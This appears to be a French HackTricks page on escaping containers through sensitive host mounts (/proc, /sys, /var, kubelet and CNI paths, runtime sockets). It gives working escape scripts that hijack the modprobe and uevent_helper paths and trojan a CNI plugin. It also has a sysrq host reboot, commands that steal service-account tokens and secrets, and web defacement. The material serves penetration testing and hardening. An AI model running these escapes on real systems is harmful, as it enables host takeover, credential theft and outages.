# Montages sensibles de l’hôte

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

Les montages de l’hôte comptent parmi les surfaces pratiques les plus importantes pour s’échapper d’un container, car ils réduisent souvent à néant l’isolation soigneusement mise en place en rétablissant une visibilité directe sur les ressources de l’hôte. Les cas dangereux ne se limitent pas à `/`. Les bind mounts de `/proc`, `/sys`, `/var`, des runtime sockets, de l’état géré par kubelet ou des chemins liés aux devices peuvent exposer des contrôles du kernel, des credentials, les filesystems de containers voisins et des interfaces de gestion du runtime.

Cette page existe séparément des pages individuelles consacrées aux protections, car le modèle d’abus est transversal. Un montage de l’hôte accessible en écriture est dangereux en partie à cause des mount namespaces, en partie à cause des user namespaces, en partie à cause de la couverture d’AppArmor ou de SELinux, et en partie à cause du chemin exact de l’hôte qui a été exposé. Le traiter comme un sujet distinct facilite considérablement l’analyse de la surface d’attaque.

## Exposition de `/proc`

procfs contient à la fois des informations ordinaires sur les processus et des interfaces de contrôle du kernel à fort impact. Un bind mount tel que `-v /proc:/host/proc`, ou une vue du container qui expose des entrées proc inattendues accessibles en écriture, peut donc entraîner une divulgation d’informations, un déni de service ou une exécution directe de code sur l’hôte.

Les chemins procfs à forte valeur incluent :

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Commencez par vérifier quelles entrées procfs à forte valeur sont visibles ou accessibles en écriture :
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ces chemins sont intéressants pour différentes raisons. `core_pattern`, `modprobe` et `binfmt_misc` peuvent devenir des chemins d'exécution de code sur l'hôte lorsqu'ils sont accessibles en écriture. `kallsyms`, `kmsg`, `kcore` et `config.gz` sont de puissantes sources de reconnaissance pour l'exploitation du kernel. `sched_debug` et `mountinfo` révèlent le contexte des processus, des cgroups et du système de fichiers, ce qui peut aider à reconstituer la disposition de l'hôte depuis l'intérieur du container.

La valeur pratique de chaque chemin est différente, et les traiter comme s'ils avaient tous le même impact complique le triage :

- `/proc/sys/kernel/core_pattern`
S'il est accessible en écriture, il s'agit de l'un des chemins procfs ayant le plus fort impact, car le kernel exécute un pipe handler après un crash. Un container capable de faire pointer `core_pattern` vers un payload stocké dans son overlay ou dans un chemin monté depuis l'hôte peut souvent obtenir une exécution de code sur l'hôte. Voir également [read-only-paths.md](protections/read-only-paths.md) pour un exemple dédié.
- `/proc/sys/kernel/modprobe`
Ce chemin contrôle le userspace helper utilisé par le kernel lorsqu'il doit invoquer la logique de chargement des modules. S'il est accessible en écriture depuis le container et interprété dans le contexte de l'hôte, il peut devenir une autre primitive d'exécution de code sur l'hôte. Il est particulièrement intéressant lorsqu'il est combiné à un moyen de déclencher le helper path.
- `/proc/sys/vm/panic_on_oom`
Il ne s'agit généralement pas d'une primitive d'escape propre, mais ce chemin peut transformer une pression mémoire en denial of service à l'échelle de l'hôte en convertissant les conditions OOM en comportement de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Si l'interface d'enregistrement est accessible en écriture, l'attaquant peut enregistrer un handler pour une valeur magic choisie et obtenir une exécution dans le contexte de l'hôte lorsqu'un fichier correspondant est exécuté.
- `/proc/config.gz`
Utile pour le triage d'un kernel exploit. Il aide à déterminer quels sous-systèmes, mitigations et fonctionnalités optionnelles du kernel sont activés sans nécessiter les métadonnées des packages de l'hôte.
- `/proc/sysrq-trigger`
Il s'agit principalement d'un chemin de denial of service, mais il est très sérieux. Il peut redémarrer, provoquer un panic ou perturber immédiatement l'hôte d'une autre manière.
- `/proc/kmsg`
Révèle les messages du kernel ring buffer. Utile pour le fingerprinting de l'hôte, l'analyse des crashs et, dans certains environnements, le leak d'informations utiles à l'exploitation du kernel.
- `/proc/kallsyms`
Précieux lorsqu'il est lisible, car il expose les informations sur les symboles exportés du kernel et peut aider à contourner les hypothèses liées à l'address randomization lors du développement d'un kernel exploit.
- `/proc/[pid]/mem`
Il s'agit d'une interface directe vers la mémoire d'un processus. Si le processus cible est accessible avec les conditions nécessaires de type ptrace, il peut être possible de lire ou de modifier la mémoire d'un autre processus. L'impact réel dépend fortement des credentials, de `hidepid`, de Yama et des restrictions ptrace ; il s'agit donc d'un chemin puissant, mais conditionnel.
- `/proc/kcore`
Expose une vue de la mémoire du système similaire à une core image. Le fichier est immense et peu pratique à utiliser, mais s'il est réellement lisible, cela indique une surface mémoire de l'hôte gravement exposée.
- `/proc/kmem` et `/proc/mem`
Interfaces historiques d'accès à la mémoire brute ayant un fort impact. Sur de nombreux systèmes modernes, elles sont désactivées ou fortement restreintes, mais si elles sont présentes et utilisables, elles doivent être considérées comme des findings critiques.
- `/proc/sched_debug`
Leak des informations sur le scheduling et les tasks, ce qui peut exposer les identités des processus de l'hôte même lorsque les autres vues des processus semblent plus propres que prévu.
- `/proc/[pid]/mountinfo`
Très utile pour reconstituer où le container se trouve réellement sur l'hôte, quels chemins sont soutenus par un overlay et si un mount accessible en écriture correspond au contenu de l'hôte ou uniquement à la couche du container.

Si `/proc/[pid]/mountinfo` ou les détails de l'overlay sont lisibles, utilisez-les pour retrouver le chemin hôte du filesystem du container :
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ces commandes sont utiles, car plusieurs techniques d'exécution sur l'hôte nécessitent de convertir un chemin situé dans le container en chemin correspondant du point de vue de l'hôte.

### Exemple complet : abus du chemin de l'helper `modprobe`

Si `/proc/sys/kernel/modprobe` est accessible en écriture depuis le container et que le chemin de l'helper est interprété dans le contexte de l'hôte, il peut être redirigé vers un payload contrôlé par l'attaquant :
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Le déclencheur exact dépend de la cible et du comportement du kernel, mais le point important est qu’un chemin d’assistance inscriptible peut rediriger une future invocation de l’assistant du kernel vers du contenu contrôlé par l’attaquant dans le chemin de l’hôte.

### Exemple complet : reconnaissance du kernel avec `kallsyms`, `kmsg` et `config.gz`

Si l’objectif est d’évaluer l’exploitabilité plutôt que de procéder immédiatement à un escape :
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ces commandes aident à déterminer si des informations utiles sur les symboles sont visibles, si les messages récents du kernel révèlent un état intéressant et quelles fonctionnalités ou mitigations du kernel sont compilées. L'impact n'est généralement pas une escape directe, mais cela peut considérablement accélérer le triage d'une vulnérabilité du kernel.

### Exemple complet : redémarrage de l'hôte via SysRq

Si `/proc/sysrq-trigger` est accessible en écriture et atteint la vue de l'hôte :
```bash
echo b > /proc/sysrq-trigger
```
L’effet est un redémarrage immédiat de l’hôte. Ce n’est pas un exemple subtil, mais il démontre clairement que l’exposition de procfs peut être bien plus grave qu’une simple divulgation d’informations.

## Exposition de `/sys`

sysfs expose de grandes quantités d’informations sur l’état du kernel et des périphériques. Certains chemins sysfs servent principalement au fingerprinting, tandis que d’autres peuvent affecter l’exécution de helpers, le comportement des périphériques, la configuration des security modules ou l’état du firmware.

Les chemins sysfs à forte valeur incluent :

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ces chemins sont importants pour différentes raisons. `/sys/class/thermal` peut influencer le comportement de la gestion thermique et donc la stabilité de l’hôte dans des environnements mal exposés. `/sys/kernel/vmcoreinfo` peut leak des informations sur les crash dumps et la disposition du kernel, ce qui facilite le fingerprinting de bas niveau de l’hôte. `/sys/kernel/security` est l’interface `securityfs` utilisée par les Linux Security Modules ; un accès inattendu peut donc exposer ou modifier l’état lié au MAC. Les chemins des variables EFI peuvent affecter les paramètres de boot gérés par le firmware, ce qui les rend bien plus sérieux que de simples fichiers de configuration. `debugfs` sous `/sys/kernel/debug` est particulièrement dangereux, car il s’agit intentionnellement d’une interface destinée aux développeurs, avec bien moins de garanties de sécurité que les APIs du kernel durcies et exposées en production.

Les commandes de review utiles pour ces chemins sont :
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Ce qui rend ces commandes intéressantes :

- `/sys/kernel/security` peut révéler si AppArmor, SELinux ou une autre surface LSM est visible alors qu'elle aurait dû rester réservée à l'hôte.
- `/sys/kernel/debug` est souvent la découverte la plus préoccupante de ce groupe. Si `debugfs` est monté et accessible en lecture ou en écriture, attendez-vous à une large surface exposée au kernel, dont le risque exact dépend des nœuds de debug activés.
- L'exposition des variables EFI est moins courante, mais son impact est élevé, car elle touche des paramètres stockés par le firmware plutôt que de simples fichiers d'exécution.
- `/sys/class/thermal` concerne principalement la stabilité de l'hôte et l'interaction avec le matériel, plutôt qu'une évasion de type shell.
- `/sys/kernel/vmcoreinfo` sert principalement de source d'identification de l'hôte et d'analyse des crashs, utile pour comprendre l'état bas niveau du kernel.

### Exemple complet : `uevent_helper`

Si `/sys/kernel/uevent_helper` est accessible en écriture, le kernel peut exécuter un helper contrôlé par l'attaquant lorsqu'un `uevent` est déclenché :
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La raison pour laquelle cela fonctionne est que le chemin du helper est interprété du point de vue de l’hôte. Une fois déclenché, le helper s’exécute dans le contexte de l’hôte plutôt qu’à l’intérieur du conteneur actuel.

## Exposition de `/var`

Le montage du `/var` de l’hôte dans un conteneur est souvent sous-estimé, car il ne semble pas aussi spectaculaire que le montage de `/`. En pratique, cela peut suffire pour atteindre les sockets d’exécution, les répertoires de snapshots des conteneurs, les volumes de pods gérés par kubelet, les tokens de service-account projetés et les systèmes de fichiers des applications voisines. Sur les nœuds modernes, `/var` est souvent l’emplacement où se trouve réellement l’état des conteneurs présentant le plus d’intérêt sur le plan opérationnel.

### Exemple Kubernetes

Un pod avec `hostPath: /var` peut souvent lire les tokens projetés d’autres pods ainsi que le contenu des snapshots overlay :
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ces commandes sont utiles, car elles permettent de déterminer si le mount expose uniquement des données applicatives sans intérêt ou des identifiants de cluster à fort impact. Un token de compte de service lisible peut immédiatement transformer une exécution de code locale en accès à l’API Kubernetes.

Si le token est présent, vérifiez ce à quoi il peut accéder au lieu de vous arrêter à la découverte du token :
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L’impact ici peut être bien plus important qu’un simple accès au node local. Un token doté d’un RBAC étendu peut transformer un `/var` monté en compromission de l’ensemble du cluster.

### Exemple Docker et containerd

Sur les hosts Docker, les données pertinentes se trouvent souvent sous `/var/lib/docker`, tandis que sur les nodes Kubernetes reposant sur containerd, elles peuvent se trouver sous `/var/lib/containerd` ou dans des chemins spécifiques au snapshotter :
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si le `/var` monté expose le contenu accessible en écriture d’un snapshot d’une autre workload, l’attaquant peut être en mesure de modifier des fichiers d’application, d’implanter du contenu web ou de changer des scripts de démarrage sans toucher à la configuration du conteneur actuel.

Idées concrètes d’exploitation une fois que du contenu de snapshot accessible en écriture a été découvert :
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ces commandes sont utiles, car elles montrent les trois principales familles d'impact liées au montage de `/var` : la falsification des applications, la récupération de secrets et le mouvement latéral vers les workloads voisins.

## État du Kubelet, plugins et chemins CNI

Le montage de `/var/lib/kubelet`, `/opt/cni/bin` ou `/etc/cni/net.d` est souvent exposé par des DaemonSets privilégiés, des agents CNI, des plugins de nœud CSI, des opérateurs GPU et des assistants de stockage. Ces montages peuvent facilement être considérés comme de simples éléments de « plomberie du nœud », mais ils se trouvent directement dans le chemin d'exécution des nouveaux pods et contiennent souvent des identifiants du kubelet, des secrets projetés, des sockets d'enregistrement et des binaires exécutables de plugins côté hôte.

Les cibles à forte valeur comprennent :

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Les commandes de revue utiles sont :
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Pourquoi ces chemins sont importants :

- `/var/lib/kubelet/pki` peut exposer les certificats clients du kubelet ainsi que d’autres credentials locaux au nœud, qui peuvent parfois être réutilisés contre l’API server ou les endpoints TLS exposés par le kubelet, selon la conception du cluster.
- `/var/lib/kubelet/pods` contient souvent des tokens de service account projetés et des Secrets montés pour les pods voisins du même nœud.
- `/var/lib/kubelet/pod-resources/kubelet.sock` constitue principalement une surface de reconnaissance, mais elle est très utile : elle révèle quels pods et conteneurs utilisent actuellement des GPUs, des hugepages, des périphériques SR-IOV et d’autres ressources locales rares du nœud.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` et `/var/lib/kubelet/plugins_registry` révèlent quels plugins CSI, DRA et device plugins sont installés, ainsi que les sockets auxquels le kubelet est censé se connecter. Si ces répertoires sont accessibles en écriture plutôt qu’en lecture seule, la découverte devient beaucoup plus grave.
- `/opt/cni/bin` et `/etc/cni/net.d` se trouvent directement sur le chemin de configuration du réseau des pods. Un accès en écriture constitue souvent une primitive d’exécution différée sur l’hôte, plutôt qu’une simple exposition de configuration.

### Exemple complet : `/opt/cni/bin` accessible en écriture

Si un répertoire de binaires CNI de l’hôte est monté en lecture-écriture, remplacer un plugin peut suffire à obtenir une exécution sur l’hôte la prochaine fois que le kubelet crée une sandbox de pod sur ce nœud :
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Ce mécanisme n'est pas aussi immédiat qu'un `docker.sock` monté, mais il est souvent plus réaliste dans des pods d'infrastructure Kubernetes compromis. Le point important est que le binaire modifié est ensuite exécuté par le flux de configuration réseau de l'hôte, et non par le conteneur actuel.


## Runtime Sockets

Les mounts sensibles de l'hôte incluent souvent des runtime sockets plutôt que des répertoires complets. Ils sont si importants qu'ils méritent d'être explicitement rappelés ici :
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Voir [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) pour les workflows complets d’exploitation une fois l’un de ces sockets monté.

Comme modèle de première interaction rapide :
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si l’une de ces tentatives réussit, le chemin entre un « mounted socket » et le démarrage d’un conteneur sibling plus privilégié est généralement beaucoup plus court que n’importe quel chemin de kernel breakout.

## Writable Host Path Task Hijack

Un host mount accessible en écriture n’a pas besoin d’exposer `/` pour être dangereux. Si le chemin monté contient des scripts, des fichiers de configuration, des hooks, des plugins ou des fichiers consommés ultérieurement par une tâche planifiée ou un service côté host, le conteneur peut être en mesure de modifier ce que le host exécute.

Flux de revue générique :
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Si un fichier accessible en écriture est utilisé par un processus hôte, gardez le payload simple et observable pendant les tests :
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
La partie intéressante est la frontière de confiance : l’écriture s’effectue depuis l’intérieur du container, mais l’exécution a lieu ultérieurement dans le contexte du service host. Cela transforme un hostPath étroit ou un bind mount en primitive différée de host-code-execution.

## CVE liés aux mounts

Les mounts host sont également liés aux vulnérabilités des runtimes. Voici quelques exemples récents importants :

- `CVE-2024-21626` dans `runc`, où un file descriptor de répertoire leaké pouvait placer le répertoire de travail sur le filesystem host.
- `CVE-2024-23651`, `CVE-2024-23652` et `CVE-2024-23653` dans BuildKit, où des Dockerfiles malveillants, des frontends et des flows `RUN --mount` pouvaient réintroduire l’accès aux fichiers host, leur suppression ou des privilèges élevés pendant les builds.
- `CVE-2024-1753` dans les flows de build Buildah et Podman, où des bind mounts conçus spécialement pendant le build pouvaient exposer `/` en lecture-écriture.
- `CVE-2025-47290` dans `containerd` 2.1.0, où un TOCTOU pendant le unpack d’une image pouvait permettre à une image spécialement conçue de modifier le filesystem host pendant le pull.

Ces CVE sont importants ici, car ils montrent que la gestion des mounts ne concerne pas uniquement la configuration de l’opérateur. Le runtime lui-même peut également introduire des conditions d’escape reposant sur les mounts.

## Vérifications

Utilisez ces commandes pour localiser rapidement les expositions de mounts les plus critiques :
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ce qui est intéressant ici :

- La racine de l’hôte, `/proc`, `/sys`, `/var` et les sockets runtime sont toutes des découvertes hautement prioritaires.
- Les entrées de proc/sys accessibles en écriture signifient souvent que le montage expose des contrôles du kernel globaux à l’hôte plutôt qu’une vue sûre du container.
- Les chemins `/var` montés nécessitent une vérification des identifiants et des workloads voisins, et pas uniquement du système de fichiers.
- Les répertoires d’état du Kubelet ainsi que les chemins CNI/plugins méritent la même priorité que les sockets runtime, car ils se trouvent souvent directement sur le chemin de création des pods et de distribution des identifiants du node.

## Références

- [Fichiers et chemins locaux utilisés par le Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [Le container cilium-agent peut accéder à l’hôte via un montage `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
